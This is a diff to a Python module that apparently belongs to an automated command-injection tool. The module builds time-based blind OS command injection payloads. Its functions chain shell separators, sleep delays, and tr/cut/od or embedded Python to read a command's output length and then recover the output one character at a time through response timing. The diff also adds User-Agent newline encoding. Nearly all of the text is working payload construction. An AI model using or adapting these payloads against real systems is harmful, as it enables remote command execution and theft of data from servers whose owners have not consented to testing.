@@ -15,7 +15,7 @@
 """
 
 import urllib
-
+from src.utils import settings
 """
   The "time-based" injection technique on Blind OS Command Injection.
   The available "time-based" payloads.
@@ -55,7 +55,7 @@ def decision(separator, TAG, output_length, delay, http_request_method):
 
   elif separator == "||" :
     payload = ("| " +
-               "[ "+str(output_length)+" -ne $(echo \""+TAG+"\" | tr -d '\n' | wc -c) ] " + separator + " "
+               "[ "+str(output_length)+" -ne $(echo "+TAG+" | tr -d '\\n' | wc -c) ] " + separator + " "
                "sleep " + str(delay) + " "
                )  
   else:
@@ -102,7 +102,11 @@ def decision_alter_shell(separator, TAG, output_length, delay, http_request_meth
                ) 
   else:
     pass
-  
+
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
+
   return payload
 
 #-----------------------------------------------
@@ -138,7 +142,7 @@ def cmd_execution(separator, cmd, output_length, delay, http_request_method):
       
   if separator == "||" :
     payload = ("| " +
-               "[ "+str(output_length)+" -ne $(echo -n $(" + cmd + ") | tr -d '\n' | wc -c) ] " + separator + " " 
+               "[ "+str(output_length)+" -ne $(echo -n $(" + cmd + ") | tr -d '\\n' | wc -c) ] " + separator + " " 
                "sleep " + str(delay) + " "
                )
   return payload
@@ -182,7 +186,11 @@ def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request
                ) 
   else:
     pass
-  
+
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
+
   return payload
 
 
@@ -192,7 +200,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request
 def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method):
   if separator == ";" :
     payload = (separator + " "
-               "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
+               "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
                "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(delay) + separator +
@@ -207,7 +215,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
       ampersand = "&"
     payload = (ampersand + " " +
                "sleep 0  " + separator + " "
-               "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
+               "str=$(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
                "sleep " + str(delay) + " "
                )
@@ -215,8 +223,8 @@ def get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_metho
       separator = urllib.unquote(separator)
 
   if separator == "||" :
-    payload = ("| " +
-               "[ " + str(ascii_char) + " -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
+    payload = ("| "
+               "[ " + str(ascii_char) + " -ne  $(" + cmd + "|tr '\\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
                "sleep " + str(delay) + " "
                )	
     
@@ -252,13 +260,17 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_r
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " "
+    payload = ("| " +
                "[ " + str(ascii_char) + " -ne  $(python -c \"print ord(\'$(echo $("+cmd+"))\'["+str(num_of_chars-1)+":"+str(num_of_chars)+"])\nexit(0)\") ] " + separator + 
                "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
                )
     
   else:
     pass
+
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
 
   return payload
   
@@ -335,5 +347,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_
     
   else:
     pass
+
+  # New line fixation
+  if settings.USER_AGENT_INJECTION == True:
+    payload = payload.replace("\n","%0d")
 
   return payload
